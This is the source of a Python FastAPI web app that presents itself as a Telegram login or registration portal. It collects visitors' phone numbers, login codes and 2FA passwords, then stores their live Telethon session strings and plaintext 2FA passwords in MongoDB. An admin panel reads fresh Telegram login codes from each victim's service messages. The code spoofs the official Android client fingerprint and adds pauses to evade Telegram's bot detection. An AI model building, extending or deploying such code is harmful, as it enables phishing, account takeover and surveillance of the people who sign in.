"""
app.py — Multi-Page Web Application for Telegram Session Registration & Admin Management

Serves HTML templates from templates/ folder:
- templates/index.html (Public Login Portal & Success Screen)
- templates/manage.html (Protected Admin Session Manager)

All session data stored in MongoDB Atlas (cloud-safe, survives Render restarts).
"""

import os
import sys
import uuid
import secrets
import asyncio
from typing import Dict, Optional, Any

from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Request, Response, Depends, Cookie
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from pydantic import BaseModel
from telethon import TelegramClient, errors
from telethon.sessions import StringSession

from core import session_manager

load_dotenv()

app = FastAPI(title="Telegram Account Login & Admin Manager")

TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
ADMIN_SESSIONS = set()
PENDING_SESSIONS: Dict[str, Dict[str, Any]] = {}

session_manager.init_db()


# ─────────────────────────────────────────────────────────────────────────────
#  Pydantic Schemas
# ─────────────────────────────────────────────────────────────────────────────

class SendCodeRequest(BaseModel):
    phone: str


class VerifyCodeRequest(BaseModel):
    login_id: str
    code: str
    password: Optional[str] = None


class AdminLoginRequest(BaseModel):
    password: str


# ─────────────────────────────────────────────────────────────────────────────
#  Admin Auth Helper
# ─────────────────────────────────────────────────────────────────────────────

def is_admin_authenticated(session_token: Optional[str] = Cookie(None, alias="admin_token")) -> bool:
    return bool(session_token and session_token in ADMIN_SESSIONS)


# ─────────────────────────────────────────────────────────────────────────────
#  API Endpoints
# ─────────────────────────────────────────────────────────────────────────────

@app.post("/api/admin/login")
def admin_login(req: AdminLoginRequest, response: Response):
    """Authenticate admin password and issue cookie token."""
    if req.password == ADMIN_PASSWORD:
        token = secrets.token_hex(24)
        ADMIN_SESSIONS.add(token)
        response.set_cookie(key="admin_token", value=token, httponly=True, max_age=86400)
        return {"status": "ok", "message": "Admin authenticated successfully."}
    raise HTTPException(status_code=401, detail="Incorrect admin password.")


@app.post("/api/admin/logout")
def admin_logout(response: Response, session_token: Optional[str] = Cookie(None, alias="admin_token")):
    """Log out admin session."""
    if session_token in ADMIN_SESSIONS:
        ADMIN_SESSIONS.remove(session_token)
    response.delete_cookie(key="admin_token")
    return {"status": "ok", "message": "Logged out."}


@app.get("/api/admin/accounts")
def get_admin_accounts(session_token: Optional[str] = Cookie(None, alias="admin_token")):
    """Get all registered Telegram sessions (Protected)."""
    if not is_admin_authenticated(session_token):
        raise HTTPException(status_code=401, detail="Unauthorized admin access.")
    accounts = session_manager.load_accounts()
    return {"status": "ok", "accounts": accounts}


@app.delete("/api/admin/accounts/{account_id}")
def delete_admin_account(account_id: int, session_token: Optional[str] = Cookie(None, alias="admin_token")):
    """Delete a saved session from MongoDB."""
    if not is_admin_authenticated(session_token):
        raise HTTPException(status_code=401, detail="Unauthorized admin access.")

    session_manager.delete_account(account_id)

    return {"status": "ok", "message": f"Account #{account_id} deleted from database."}


@app.get("/api/admin/accounts/{account_id}/otp")
async def get_account_otp(account_id: int, session_token: Optional[str] = Cookie(None, alias="admin_token")):
    """Read recent Telegram login verification codes for an active session."""
    if not is_admin_authenticated(session_token):
        raise HTTPException(status_code=401, detail="Unauthorized admin access.")

    # Use official Android api_id/api_hash for consistent fingerprint
    api_id   = session_manager.OFFICIAL_ANDROID_API_ID
    api_hash = session_manager.OFFICIAL_ANDROID_API_HASH

    acc_dict = session_manager.get_account_by_id(account_id)
    if not acc_dict:
        raise HTTPException(status_code=404, detail="Account session not found.")

    # Get the StringSession from MongoDB
    sess_string = session_manager.get_session_string(acc_dict["session_file"])
    if not sess_string:
        raise HTTPException(status_code=404, detail="No saved session found in database.")

    client = session_manager.create_telegram_client(sess_string, api_id, api_hash, acc_dict)

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            raise HTTPException(status_code=400, detail="Session is no longer authorized.")

        found_codes = []

        # 1. Search recent messages from Telegram Official Service Notifications (777000 or "Telegram")
        async for msg in client.iter_messages(777000, limit=5):
            text = msg.text or ""
            # Extract 5-digit or 6-digit numeric login codes
            import re
            matches = re.findall(r'\b\d{5,6}\b', text)
            if matches:
                found_codes.append({
                    "date": msg.date.strftime("%Y-%m-%d %H:%M:%S") if msg.date else "Recently",
                    "text": text,
                    "code": matches[0]
                })

        # Fallback search if 777000 entity is not cached
        if not found_codes:
            async for dialog in client.iter_dialogs(limit=10):
                if getattr(dialog.entity, "id", 0) == 777000 or "Telegram" in getattr(dialog.entity, "first_name", ""):
                    async for msg in client.iter_messages(dialog.entity, limit=5):
                        text = msg.text or ""
                        import re
                        matches = re.findall(r'\b\d{5,6}\b', text)
                        if matches:
                            found_codes.append({
                                "date": msg.date.strftime("%Y-%m-%d %H:%M:%S") if msg.date else "Recently",
                                "text": text,
                                "code": matches[0]
                            })

        await client.disconnect()

        if found_codes:
            latest = found_codes[0]
            return {
                "status": "ok",
                "code": latest["code"],
                "full_message": latest["text"],
                "received_at": latest["date"]
            }
        else:
            return {
                "status": "no_code",
                "message": "No recent Telegram login code found in messages."
            }

    except Exception as e:
        if client.is_connected():
            await client.disconnect()
        raise HTTPException(status_code=400, detail=f"Failed to fetch Telegram code: {str(e)}")



@app.post("/api/login/send-code")
async def send_otp_code(req: SendCodeRequest):
    """Public API: Step 1 Send Telegram Login OTP Code."""
    # Use official Android api_id/api_hash — they are embedded in session_manager
    api_id   = session_manager.OFFICIAL_ANDROID_API_ID
    api_hash = session_manager.OFFICIAL_ANDROID_API_HASH

    phone = req.phone.strip()
    if not phone:
        raise HTTPException(status_code=400, detail="Phone number is required.")

    sess_name = phone.replace("+", "").replace(" ", "").strip()

    # Check if account already exists in MongoDB
    db_acc = session_manager.get_account_by_phone_or_session(phone, sess_name)

    # If account exists, try to reuse its saved StringSession
    existing_session_string = ""
    if db_acc:
        existing_session_string = session_manager.get_session_string(sess_name)

    # Create client — reuse saved session if available, otherwise start fresh
    client = session_manager.create_telegram_client(existing_session_string, api_id, api_hash)

    try:
        await client.connect()
        if not await client.is_user_authorized():
            sent_code = await client.send_code_request(phone)
            login_id  = str(uuid.uuid4())

            PENDING_SESSIONS[login_id] = {
                "client": client,
                "phone": phone,
                "phone_code_hash": sent_code.phone_code_hash,
                "sess_name": sess_name,
            }

            return {
                "status": "code_sent",
                "login_id": login_id,
                "message": f"Verification code sent to Telegram on {phone}."
            }
        else:
            me = await client.get_me()
            real_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
            if me.username:
                real_name += f" (@{me.username})"
            if not real_name:
                real_name = f"Telegram Account ({phone})"

            # Save the StringSession to MongoDB before disconnecting
            saved_session = client.session.save()
            await client.disconnect()

            session_manager.upsert_account(
                phone=phone,
                session_file=sess_name,
                label=real_name,
                display_name=real_name,
                status="active",
                session_string=saved_session,
            )

            return {
                "status": "already_authorized",
                "account_name": real_name,
                "phone": phone,
                "session_file": f"{sess_name}.session",
                "message": f"Session was already registered as {real_name}."
            }

    except Exception as e:
        if client.is_connected():
            await client.disconnect()
        err_str = str(e)
        # Special case: Telegram CAPTCHA challenge — triggered by heavy datacenter IP flagging
        if "RECAPTCHA_CHECK" in err_str or "recaptcha" in err_str.lower():
            raise HTTPException(
                status_code=400,
                detail=(
                    "⚠️ Telegram requires a CAPTCHA challenge for this request. "
                    "This happens when your phone number has never logged in from a server before. "
                    "Please try: 1) Log in once via the official Telegram app to activate the account, "
                    "or 2) Ask the admin to enable a residential proxy on the server."
                )
            )
        err_msg = session_manager.handle_telethon_error(sess_name, e)
        raise HTTPException(status_code=400, detail=f"Failed to send code: {err_msg}")


@app.post("/api/login/verify-code")
async def verify_otp_code(req: VerifyCodeRequest):
    """Public API: Step 2 Submit OTP code / 2FA password."""
    pending = PENDING_SESSIONS.get(req.login_id)
    if not pending:
        raise HTTPException(status_code=400, detail="Session expired. Please enter phone number again.")

    client: TelegramClient = pending["client"]
    phone = pending["phone"]
    phone_code_hash = pending["phone_code_hash"]
    sess_name = pending["sess_name"]

    try:
        try:
            await client.sign_in(phone=phone, code=req.code.strip(), phone_code_hash=phone_code_hash)
        except errors.SessionPasswordNeededError:
            if not req.password:
                return {
                    "status": "2fa_required",
                    "login_id": req.login_id,
                    "message": "Two-Step Verification (2FA) password required."
                }
            await client.sign_in(password=req.password.strip())

        # Humanized pause to avoid triggering Telegram's rapid automated bot heuristics
        await asyncio.sleep(1.0)
        me = await client.get_me()
        real_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        if me.username:
            real_name += f" (@{me.username})"
        if not real_name:
            real_name = f"Telegram Account ({phone})"

        # Save StringSession to MongoDB BEFORE disconnecting
        saved_session = client.session.save()
        await asyncio.sleep(0.5)
        await client.disconnect()
        PENDING_SESSIONS.pop(req.login_id, None)

        pass_to_save = req.password.strip() if req.password else None

        # Store in MongoDB
        session_manager.upsert_account(
            phone=phone,
            session_file=sess_name,
            label=real_name,
            display_name=real_name,
            status="active",
            two_fa_pass=pass_to_save,
            session_string=saved_session,
        )

        return {
            "status": "success",
            "account_name": real_name,
            "phone": phone,
            "session_file": f"{sess_name}.session",
            "message": "You have registered successfully!"
        }

    except errors.PhoneCodeInvalidError:
        raise HTTPException(status_code=400, detail="Invalid verification code.")
    except errors.PhoneCodeExpiredError:
        PENDING_SESSIONS.pop(req.login_id, None)
        raise HTTPException(status_code=400, detail="Code expired. Please request a new code.")
    except errors.PasswordHashInvalidError:
        raise HTTPException(status_code=400, detail="Incorrect 2FA password.")
    except Exception as e:
        if client.is_connected():
            await client.disconnect()
        err_msg = session_manager.handle_telethon_error(sess_name, e)
        raise HTTPException(status_code=400, detail=f"Login failed: {err_msg}")


# ─────────────────────────────────────────────────────────────────────────────
#  HTML ROUTE HANDLERS
# ─────────────────────────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
def index_login_page():
    path = os.path.join(TEMPLATES_DIR, "index.html")
    with open(path, "r", encoding="utf-8") as f:
        return HTMLResponse(content=f.read())


@app.get("/dashboard", response_class=HTMLResponse)
def dashboard_page():
    path = os.path.join(TEMPLATES_DIR, "dashboard.html")
    with open(path, "r", encoding="utf-8") as f:
        return HTMLResponse(content=f.read())


@app.get("/manage", response_class=HTMLResponse)
def admin_manage_page():
    path = os.path.join(TEMPLATES_DIR, "manage.html")
    with open(path, "r", encoding="utf-8") as f:
        return HTMLResponse(content=f.read())


if __name__ == "__main__":
    import uvicorn
    host = os.getenv("HOST", "0.0.0.0")
    port = int(os.getenv("PORT", "5000"))
    uvicorn.run("app:app", host=host, port=port, reload=False)

